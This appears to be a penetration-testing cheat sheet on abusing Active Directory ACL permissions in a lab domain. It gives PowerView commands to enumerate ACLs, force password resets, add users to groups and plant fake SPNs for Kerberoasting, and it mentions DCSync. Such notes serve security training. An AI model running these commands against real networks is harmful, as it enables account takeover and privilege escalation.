
We are interested in the following permissions:
- GenericAll: Full permissions on object
- GenericWrite: Edit certain attributes on the object
- WriteOwner: Change ownership of the object
- WriteDACL: Edit ACE's applied to object
- AllExtendedRights: Change password, reset password, etc.
- ForceChangePassword: Password change for object
- Self (Self-Membership): Add ourselves to for example a group

Abuse Paths:
- Reset User Passwords
- Add ourselves to groups
- Assign SPNs for Kerberoasting
- Perform DCSync for Domain control

Enumeration
---
PowerView ([https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon))
Find ACLs
```
Find-InterestingDomainAcl
```

User Enumeration
```
$sid = Convert-NameToSid wley
```
```
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Group Enumeration
Checking which members has GenericAll permissions in the group
```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
SID to Name
```
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```

Check inherited privileges via nested groups
```
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

Attack Paths
---

Force Password Change (ForceChangePassword)
Create PSCredential Object
```
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```
Create SecureString Object
```
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
Change Password
```
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

Add User to Group (GenericWrite/ AddSelf)
```
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
Add to group
```
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

Assign SPN for Kerberoasting (GenericWrite)
Create fake SPN
```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

WriteDACL can be used to give ourselves GenericAll permissions


